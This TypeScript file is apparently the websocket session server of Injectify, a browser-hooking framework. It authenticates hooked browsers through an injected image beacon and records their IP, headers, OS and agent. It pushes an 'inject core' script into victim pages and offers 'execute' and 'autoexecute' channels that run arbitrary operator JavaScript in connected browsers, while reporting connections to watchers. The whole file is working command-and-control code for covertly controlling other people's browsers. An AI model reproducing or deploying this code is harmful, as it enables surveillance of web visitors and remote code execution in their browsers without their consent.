declare var global: any

import { Database } from '../database/definitions/database'
import { SocketSession } from './definitions/session'

import ClientInfo from './ClientInfo'
import InjectAPI from './InjectAPI'
import chalk from 'chalk'
import _ from 'lodash'
const { RateLimiter } = require('limiter')
const atob = require('atob')
const getIP = require('../lib/getIP.js')
const uuidv4 = require('uuid/v4')
const WebSocket = require('ws')
const pako = require('pako')

export default class {
  db: any
  server: any

  constructor(db: any, server: any) {
    this.db = db
    this.server = server
  }

  initiate(ws: any, req: any) {
    this.validate(req).then(project => {
      new Session(ws, req, project)
    }).catch((error: string | Error) => {
      if (typeof error === 'string') {
        if (global.config.verbose)
          console.error(
            chalk.redBright('[inject] ') +
            chalk.yellowBright(error)
          )
      } else {
        throw error
      }
    })
  }

  validate(req: Request) {
    return new Promise<SocketSession.session>((resolve, reject) => {
      let url = req.url.split('?')
      if (url) {
        let state = {
          project: url[url.length - 1],
          debug: false
        }
        if (state.project.charAt(0) === '$') {
          state = {
            project: state.project.substring(1),
            debug: true
          }
        }
        if (state.project) {
          try {
            state.project = atob(state.project)
          } catch (e) {
            reject('websocket with invalid base64 encoded project name, terminating')
            return
          }
          this.db.collection('projects', (err, projects) => {
            if (err) throw err
            projects.findOne({
              'name': state.project
            }).then((doc: Database.project) => {
              if (doc !== null) {
                resolve({
                  project: {
                    id: doc['_id'],
                    name: doc.name,
                    inject: doc.inject
                  },
                  id: uuidv4(),
                  debug: state.debug
                })
              } else {
                reject(`websocket connection to nonexistent project "${state.project}", terminating`)
              }
            })
          })
        } else {
          reject('websocket connection with invalid project name, terminating')
        }
      } else {
        reject('websocket connection with missing project name, terminating')
      }
    })
  }
}

class Session {
  socket: any
  session: SocketSession.session
  project: SocketSession.project
  token: string
  req: Request
  authReq: Request
  client: any

  constructor(socket: any, req: any, session: SocketSession.session) {
    socket.id = uuidv4()
    req.id = socket.id
    this.socket = socket
    this.req = req
    this.session = session
    this.project = session.project
    /**
     * Give the client time to connect, or else they may be droppped
     */
    setTimeout(() => {
      this.auth(socket.id)
    }, 100)
  }

  send(topic: string, data: any) {
    let json = JSON.stringify({
      t: topic,
      d: data
    })
    if (global.config.compression && !this.session.debug && !(/^core|auth$/.test(topic))) {
      json = pako.deflate(JSON.stringify({
        t: topic,
        d: data
      }), {
        to: 'string'
      })
      json = '#' + json
    }
    try {
      this.socket.send(json)
    } catch(error) {
      if (this.socket.readyState !== WebSocket.OPEN) this.socket.close()
    }
  }

  auth(id: string) {
    this.send('auth', `var server=ws.url.split("/"),protocol="https://";"ws:"===server[0]&&(protocol="http://"),server=protocol+server[2];var auth=new Image;auth.src=server+"/a?id=${encodeURIComponent(id)}&z=${uuidv4()}";auth.onload`)
    global.inject.authenticate[id] = (token: string, req) => this.authorized(token, req)
  }

  authorized(token: string, req) {
    this.token = token
    this.authReq = req
    let injectAPI
    let limiter = new RateLimiter(global.config.rateLimiting.inject.websocket.max, global.config.rateLimiting.inject.websocket.windowMs, true)
    let limiterLimiter = new RateLimiter(50, 15000, true)

    this.socket.on('message', raw => {
      let { tokens } = global.config.rateLimiting.inject
      let token = 1
      let topic: string
      let data: any
      try {
        /**
         * Compression
         */
        if (raw.charAt(0) === '#') {
          if (global.config.compression) {
            try {
              raw = pako.inflate(raw.substr(1), { to: 'string' })
            } catch(e) {
              if (global.config.debug) {
                console.error(
                  chalk.redBright('[inject/compression] ') +
                  chalk.yellowBright(`Failed to decompress a Websocket message from client ${this.client.client.ip.query}`)
                )
              }
              return
            }
          } else {
            if (global.config.debug) {
              console.error(
                chalk.redBright('[inject/compression] ') +
                chalk.yellowBright(`Dropped a Websocket message from client ${this.client.client.ip.query}, because server set to no compression`)
              )
            }
            return
          }
        }
        try {
          raw = JSON.parse(raw)
        } catch(e) {
          if (global.config.debug)
            console.error(
              chalk.redBright('[inject/client] ') +
              chalk.yellowBright(`Failed to parse JSON string from client ${this.client.client.ip.query}`)
            )
          return
        }
        if (typeof raw.t !== 'string') return
        topic = raw.t
        data = raw.d
      } catch (e) {
        if (global.config.debug)
          console.error(
            chalk.redBright('[inject/client] ') +
            chalk.yellowBright(`Server threw an error whilst handling client ${this.client.client.ip.query}`),
            e
          )
        return
      }
      if (tokens) {
        switch (topic) {
          case 'p':
            if (typeof tokens.pageGhost === 'number') token = tokens.pageGhost
            break
          case 'l' || 'e':
            if (typeof tokens.logger === 'number') token = tokens.logger
            break
          case 'module':
            if (typeof tokens.modules === 'number') token = tokens.modules
            break
          case 'i':
            if (typeof tokens.clientInfo === 'number') token = tokens.clientInfo
            break
        }
      }
      limiter.removeTokens(token, (err, remainingRequests) => {
        if (!(err || remainingRequests < 1)) {
          if (injectAPI.on[topic]) injectAPI.on[topic](data)
        } else {
          // Don't send any warnings for events that are bound to go over the limit often
          if (/^p|heartbeat$/.test(topic)) return
          // Rate limit error messages, stopping the client from being flooded
          limiterLimiter.removeTokens(1, (error, remaining) => {
            if (!(error || remaining < 1)) {
              this.send('rate-limiter', {
                topic: topic,
                data: data
              })
            }
          })
        }
      })
    })
    this.socket.on('close', () => this.close())
    this.socket.on('error', () => {
      if (this.socket.readyState !== WebSocket.OPEN) {
        this.socket.close()
      }
    })

    /**
     * Add the session to the global sessions object
     */
    this.ledge(({ client, session }) => {
      /**
       * Log to console
       */
      if (global.config.debug) {
        console.log(
          chalk.greenBright('[inject] ') +
          chalk.yellowBright('new websocket connection for project ') +
          chalk.magentaBright(this.project.name) +
          chalk.yellowBright(' from ') +
          chalk.magentaBright(client.ip.query)
        )
      }
      /**
       * Set the client object
       */
      this.client = {
        client: client,
        session: session
      }
      /**
       * Enable access to the inject API
       */
      injectAPI = new InjectAPI(this)
      /**
       * Callback to the Injectify users
       */
      if (global.inject.watchers[this.project.id]) {
        setTimeout(() => {
          global.inject.watchers[this.project.id].forEach(watcher => {
            watcher.callback('connect', {
              token: this.token,
              data: global.inject.clients[this.project.id][this.token]
            })
          })
        }, 0)
      }

      /**
       * Send the inject core
       */
      let core = global.inject.core
      if (this.session.debug) core = global.inject.debugCore
      let socketHeaders = this.req.headers
      delete socketHeaders['user-agent']
      core = core
      .replace('client.ip', JSON.stringify(client.ip))
      .replace('client.id', JSON.stringify(session.id))
      .replace('client.agent', JSON.stringify(client.agent))
      .replace('client.headers', JSON.stringify(socketHeaders))
      .replace('client.platform', JSON.stringify(client.platform))
      .replace('client.os', JSON.stringify(client.os))
      .replace('client.compression', this.session.debug ? false : !!global.config.compression)
      this.send('core', core)

      /**
       * Send the auto-execute script
       */
      if (this.session.project.console) {
        if (this.session.project.console.autoexecute) {
          this.send('execute', this.session.project.console.autoexecute)
        }
      }
    })
  }

  ledge(resolve: Function) {
    /**
     * Create an object for the project
     */
    if (!global.inject.clients[this.project.id]) {
      global.inject.clients[this.project.id] = {}
    }

    ClientInfo(this.req, this.authReq, this.session).then(({ client, session }) => {
      /**
       * Create an object for the client
       */
      if (!global.inject.clients[this.project.id][this.token]) {
        global.inject.clients[this.project.id][this.token] = client
      }
      /**
       * Add a reference to the send method
       */
      session.execute = script => {
        this.send('execute', script)
      }
      /**
       * Add a reference to the send method
       */
      session.scroll = array => {
        this.send('scroll', array)
      }
      global.inject.clients[this.project.id][this.token].sessions.push(session)

      resolve({
        client: client,
        session: session
      })
    })
  }

  close() {
    /**
     * => NOTE: this line *may* cause trouble down the line \/
     */
    if (global.inject.clients[this.project.id] && global.inject.clients[this.project.id][this.token] && global.inject.clients[this.project.id][this.token].sessions) {
      /**
       * Remove them from the clients object
       */
      if (global.inject.clients[this.project.id][this.token].sessions.length === 1) {
        /**
         * Only session left with their token, delete token
         */
        delete global.inject.clients[this.project.id][this.token]
      } else {
        /**
         * Other sessions exist with their token
         */
        global.inject.clients[this.project.id][this.token].sessions = global.inject.clients[this.project.id][this.token].sessions.filter(session => session.id !== this.session.id)
      }
      /**
       * Callback to the Injectify users
       */
      if (global.inject.watchers[this.project.id]) {
        setTimeout(() => {
          global.inject.watchers[this.project.id].forEach(watcher => {
            watcher.callback('disconnect', {
              token: this.token,
              id: this.session.id
            })
          })
        }, 0)
      }
    }
  }
}